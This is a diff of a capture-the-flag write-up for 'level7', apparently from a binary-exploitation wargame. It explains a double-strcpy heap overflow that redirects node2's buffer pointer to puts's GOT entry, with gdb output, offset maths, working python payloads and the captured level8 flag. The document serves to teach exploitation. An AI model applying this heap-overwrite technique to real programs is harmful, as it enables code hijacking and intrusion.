@@ -1,17 +1,15 @@
-# Level 7 — Heap Pointer Hijack to GOT Overwrite
+# level7
 
-## Introduction
-This level demonstrates a advanced heap exploit technique: overwriting a structure's buffer pointer on the heap to perform an arbitrary write, which is then used to hijack the GOT entry of `puts`.
+Analyzing the code, we can see we got two nodes.
 
-## Analysis
-The reconstructed C code of the binary is:
+Here is the reconstructed C code:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
 
-char c[80]; // Global buffer
+char c[80];
 
 struct Node {
     int id;
@@ -20,7 +18,7 @@ struct Node {
 
 void m(void) {
     time_t tVar1 = time(NULL);
-    printf("%s - %ld\n", c, tVar1); // Prints the flag
+    printf("%s - %ld\n", c, tVar1);
 }
 
 int main(int argc, char *argv[]) {
@@ -28,46 +26,49 @@ int main(int argc, char *argv[]) {
     struct Node *node2;
     FILE *stream;
 
-    node1 = (struct Node *)malloc(sizeof(struct Node)); // 8 bytes
+    node1 = (struct Node *)malloc(sizeof(struct Node));
     node1->id = 1;
-    node1->buf = (char *)malloc(8); // 8 bytes
+    node1->buf = (char *)malloc(8);
 
-    node2 = (struct Node *)malloc(sizeof(struct Node)); // 8 bytes
+    node2 = (struct Node *)malloc(sizeof(struct Node));
     node2->id = 2;
-    node2->buf = (char *)malloc(8); // 8 bytes
+    node2->buf = (char *)malloc(8);
 
     if (argc > 2) {
-        strcpy(node1->buf, argv[1]); // Unbounded strcpy
-        strcpy(node2->buf, argv[2]); // Unbounded strcpy
+        strcpy(node1->buf, argv[1]);
+        strcpy(node2->buf, argv[2]);
     }
 
     stream = fopen("/home/user/level8/.pass", "r");
     if (stream != NULL) {
-        fgets(c, 0x44, stream); // Reads flag into global c
+        fgets(c, 0x44, stream);
         fclose(stream);
     }
 
-    puts("~~"); // Executes puts
+    puts("~~");
     return 0;
 }
 ```
 
-The program contains a function `m` that prints the flag stored in `c`, but `m` is never called. However, `puts` is called at the end of `main`. If we overwrite the GOT entry of `puts` with the address of `m`, we can redirect execution when `puts("~~")` is called.
+We allocate memory for each node struct, and each one allocates 8 bytes for the buffer.
 
-### Double strcpy Heap Exploit Strategy
-We have two sequential allocations:
-1. `node1` struct.
-2. `node1->buf` buffer.
-3. `node2` struct.
-4. `node2->buf` buffer.
+The heap layout looks like this:
+```text
+[metadata n1] + [user data n1] + [metadata n1buf] + [user data n1buf] + [metadata n2] + [user data n2] + [metadata n2buf] + [user data n2buf]
+```
+In terms of sizes:
+```text
+8 + sizeof(node) + 8 + 8(buffer) + 8 + sizeof(node) + 8 + 8(buffer)
+```
 
-Since `node1->buf` is allocated before the `node2` struct, we can overflow `node1->buf` (via `argv[1]`) to overwrite the `node2` struct itself. Specifically, we will overwrite `node2->buf` (which is a pointer) with the GOT entry address of `puts`.
+In this case, we use `argv[1]` to overflow `node1`'s buffer, and `argv[2]` to overwrite the target buffer of `node2`.
 
-When the second `strcpy(node2->buf, argv[2])` runs, it will copy `argv[2]` to the destination address stored in `node2->buf`. Since we hijacked `node2->buf` to point to the GOT entry of `puts`, `strcpy` will overwrite the GOT entry of `puts` with `argv[2]`. We set `argv[2]` to the address of `m`.
+### Exploitation Strategy
 
-### Finding the GOT Entry Address of `puts`
-We disassemble the PLT stub for `puts` inside `gdb`:
-```gdb
+The only function called after the copies is `puts("~~")`. We can use the GOT overwrite trick here.
+
+Disassembling `puts@plt` in GDB:
+```text
 (gdb) disassemble puts
 Dump of assembler code for function puts@plt:
    0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
@@ -75,42 +76,70 @@ Dump of assembler code for function puts@plt:
    0x0804840b <+11>:	jmp    0x80483a0
 End of assembler dump.
 ```
-The jump targets `0x8049928`. This is the GOT entry address of `puts`.
+The GOT address of `puts` is `0x08049928`.
 
-### Finding the Address of `m`
-We use `gdb` to find the address of the `m` function:
-```gdb
+Now, how does the program copy?
+```c
+if (argc > 2) {
+    strcpy(node1->buf, argv[1]);
+    strcpy(node2->buf, argv[2]);
+}
+```
+`strcpy` puts content into the target address pointer. In this case, `node1->buf` and `node2->buf` are heap pointers.
+
+We can use the first `strcpy` (with `argv[1]`) to overflow past `node1->buf` and overwrite the `node2->buf` pointer stored inside the `node2` struct. This way, when the second `strcpy` runs, it will copy `argv[2]` into whatever address we wrote into `node2->buf`—which will be `puts`'s GOT entry address.
+
+### Offset Calculation
+
+Let's look at the memory layout of the `Node` struct:
+```text
+[int id (4 bytes)] [char *buf pointer (4 bytes)]
+```
+
+In memory, a node looks like this:
+```text
+[id bytes (4)] [buf pointer bytes (4)]
+```
+
+We start writing from `node1->buf`.
+To reach `node2->buf` pointer, we need to overwrite:
+- `8` bytes of `node1->buf` user data.
+- `8` bytes of `node2` chunk metadata.
+- `4` bytes of `node2->id`.
+Total padding = `8 + 8 + 4 = 20` bytes.
+
+So, payload1 (`argv[1]`) will contain:
+`8 (buffer padding) + 8 (metadata padding) + 4 (id padding) + GOT address`
+
+Using `[::-1]` to reverse the target GOT address of `puts` (`0x08049928`), we build payload1:
+```bash
+python -c 'print "B" * 8 + "M" * 8 + "I" * 4 + "\x08\x04\x99\x28"[::-1]' > payload1
+```
+
+For the second argument `argv[2]`, we want to write the address of our target function `m`.
+Using GDB:
+```text
 (gdb) info functions m
-All functions matching regular expression "m":
-
 Non-debugging symbols:
+...
 0x080484f4  m
+...
 ```
 The address of `m` is `0x080484f4`.
 
-### Offset Calculation
-We need to know the offset from `node1->buf` to `node2->buf` in `node2` struct:
-- `node1->buf` user data size: 8 bytes.
-- `node2` chunk metadata size: 8 bytes.
-- `node2->id` size: 4 bytes.
-Total padding = `8 + 8 + 4 = 20` bytes.
-
-Following the 20 bytes of padding, we write the target address of `puts`'s GOT entry (`0x08049928`).
-
-### Crafting the Arguments
-- **`argv[1]` (20 bytes padding + target address):**
-  `"A" * 20 + "\x28\x99\x04\x08"`
-- **`argv[2]` (address of `m`):**
-  `"\xf4\x84\x04\x08"`
-
-## Exploit
-Run the binary passing the two payloads:
+Using `[::-1]` to reverse `m`'s address, we build payload2:
 ```bash
-./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+python -c 'print "\x08\x04\x84\xf4"[::-1]' > payload2
 ```
 
-This overwrites `puts`'s GOT entry with `m`'s address. When `puts` is called, it branches to `m` and prints the flag for `level8`:
+### Execution
+
+We run the exploit passing the two payloads:
+```bash
+./level7 $(cat payload1) $(cat payload2)
+```
+
+This overwrites `puts`'s GOT entry with `m`'s address. When `puts("~~")` is called, it redirects to `m`, printing the flag for `level8`:
 ```
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 ```
-We save this password to proceed to `level8`.
